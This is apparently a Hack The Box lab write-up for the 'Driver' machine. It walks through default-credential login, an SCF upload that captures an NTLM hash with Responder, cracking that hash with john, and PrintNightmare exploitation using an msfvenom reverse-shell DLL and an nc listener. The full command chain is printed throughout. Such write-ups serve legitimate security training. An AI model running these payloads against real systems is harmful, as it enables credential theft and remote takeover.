# Driver

## Enumeration

### Nmap
Open ports:
- 80/tcp - http
- 135/tcp - msrpc
- 445/tcp - microsoft-ds

### http
Going to our ip `10.10.11.106` we are prompted with a login, simply by trying the a few basic admin creds we can get in:

> Username: admin
> 
> Password: admin

Boom! We've got a slight foothold. Now lets move to __*attack mode*__

## Gathering Info

### SCF
On the page `/fw_up.php` we find a form that we can apparently upload a firmware update to the file share... so lets upload some malicious firmware.

We will be uploading an `.scf` file, beginning the name with `@`, containing this (replacing `YOUR_IP` with your ip address):
```
$ cat @attack.scf
[Shell]
Command=2
IconFile=\\YOUR_IP\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

### Responder
We will be using the program `responder` to actually do the communication for this attack, replacing `NETWORK_ADAPTER` with your adapter (like eth0 or tun0):
```
$ sudo responder -I NETWORK_ADAPTER -wrf
```

### Execution
To execute our initial attack, we will perform these steps:

1. Begin `responder` as shown above
2. Log into the web server
3. Upload `@attack.scf` to `/fw_up.php`

Using this, we get a hash for a user `tony`:
```
tony::DRIVER:c8db3c62a89517e7:94CFE550B36EF78F0154AF9DC4F932EC:0101000000000000006641AD67BFD701449AE5226262DF4E0000000002000800440044004E00300001001E00570049004E002D003300580048004C004A0047004700520046004500380004003400570049004E002D003300580048004C004A004700470052004600450038002E00440044004E0030002E004C004F00430041004C0003001400440044004E0030002E004C004F00430041004C0005001400440044004E0030002E004C004F00430041004C0007000800006641AD67BFD701060004000200000008003000300000000000000000000000002000002358BFF9D2C4074E19BD41974897E8B5115E2BDDA8FA3A856C8FE1703CE6762B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0032003900000000000000000000000000
```

Now we can use john to attempt to crack this hash! Running `john tony.hash --fork=2 -w=/usr/share/wordlists/rockyou.txt` we get the following creds:

> Username: tony
>
> Password: liltony

## Attack
Now, we have some basic creds for tony, using something like `smbclient.py` we can access the SMB share via the command line to make sure our creds work:
```
$ python3 smbclient.py tony:liltony@10.10.11.106
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

#
```

### PrintNightmare
We are now able to use the [PrintNightmare CVE](https://github.com/cube0x0/CVE-2021-1675) in order to gain a foothold into the target machine. To start, we will need to configure an SMB share on our local machine to tell the target to download a malicious file. We can do this by adding a few lines to `/etc/samba/smb.conf` within the __Share Definitions__ section:
```
[open]
  path = /home/kali/Documents/learning/hackthebox/Machines/Driver
  browsable = yes
  guest ok = yes
  read only = no
  force user = kali
```

Now, we can use `msfvenom` to generate the dll that we will use as a payload (replace YOUR\_IP with your ip):
```
$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o ../rev.dll
```

Finally, we must start a `nc` listener on the specified `LPORT`:
```
$ nc -lvnp 4444
```

After restarting smbd, we can now attempt our foothold execution:
```
$ python3 CVE-2021-1675.py tony:liltony@10.10.11.106 '\\YOUR_IP\open\rev.dll'
```

Boom! We have a root shell. From here, we can find the user (tony) and root (Administrator) flags on their respective desktops.
